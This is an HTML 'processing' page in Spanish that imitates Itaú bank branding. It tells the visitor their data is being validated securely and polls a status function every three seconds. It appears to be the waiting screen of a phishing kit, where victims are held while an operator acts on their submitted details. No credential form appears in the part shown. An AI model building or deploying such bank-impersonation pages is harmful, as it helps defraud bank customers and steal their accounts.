<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Procesando | ItaÃº</title>
    <link rel="icon" type="image/png" href="itau_logo.png">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="../../scripts/functions2.js"></script>
    <style>
        :root {
            --itau-orange: #fe6a00;
            --itau-blue: #003399;
            --text-dark: #2d2d2d;
            --text-gray: #6b6b6b;
        }

        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #ffffff;
            font-family: 'Inter', sans-serif;
        }

        .loader-container {
            text-align: center;
            padding: 40px;
            max-width: 400px;
            width: 90%;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .logo-itau {
            width: 72px;
            height: auto;
            border-radius: 12px;
            margin-bottom: 40px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
        }

        /* Advanced Ripple Spinner */
        .spinner-box {
            position: relative;
            width: 80px;
            height: 80px;
            margin-bottom: 40px;
        }

        .ripple {
            position: absolute;
            border: 4px solid var(--itau-orange);
            opacity: 1;
            border-radius: 50%;
            animation: ripple 1.2s cubic-bezier(0, 0.2, 0.8, 1) infinite;
        }

        .ripple:nth-child(2) {
            animation-delay: -0.5s;
            border-color: var(--itau-blue);
        }

        @keyframes ripple {
            0% {
                top: 36px;
                left: 36px;
                width: 0;
                height: 0;
                opacity: 0;
            }
            4.9% {
                top: 36px;
                left: 36px;
                width: 0;
                height: 0;
                opacity: 0;
            }
            5% {
                top: 36px;
                left: 36px;
                width: 0;
                height: 0;
                opacity: 1;
            }
            100% {
                top: 0px;
                left: 0px;
                width: 72px;
                height: 72px;
                opacity: 0;
            }
        }

        .loading-title {
            font-size: 20px;
            color: var(--text-dark);
            font-weight: 700;
            margin-bottom: 12px;
        }

        .loading-subtitle {
            font-size: 15px;
            color: var(--text-gray);
            line-height: 1.5;
        }

        /* Branded Progress Bar */
        .progress-bar {
            width: 100%;
            height: 4px;
            background-color: #f1f1f1;
            border-radius: 10px;
            margin-top: 30px;
            overflow: hidden;
            position: relative;
        }

        .progress-line {
            position: absolute;
            height: 100%;
            width: 30%;
            background-color: var(--itau-orange);
            border-radius: 10px;
            animation: slide 1.5s infinite ease-in-out;
        }

        @keyframes slide {
            0% { left: -30%; }
            100% { left: 100%; }
        }
    </style>
</head>
<body>

    <div class="loader-container">
        <img src="itau_logo.png" alt="ItaÃº" class="logo-itau">
        
        <div class="spinner-box">
            <div class="ripple"></div>
            <div class="ripple"></div>
        </div>

        <div class="loading-title">Valida tus datos</div>
        <div class="loading-subtitle">Estamos procesando tu informaciÃ³n de forma segura. <br>Por favor, espera un momento.</div>

        <div class="progress-bar">
            <div class="progress-line"></div>
        </div>
    </div>

    <script>
        $(document).ready(function() {
            // Existing pooling logic
            setInterval(consultar_estado, 3000);
        });
    </script>
</body>
</html>

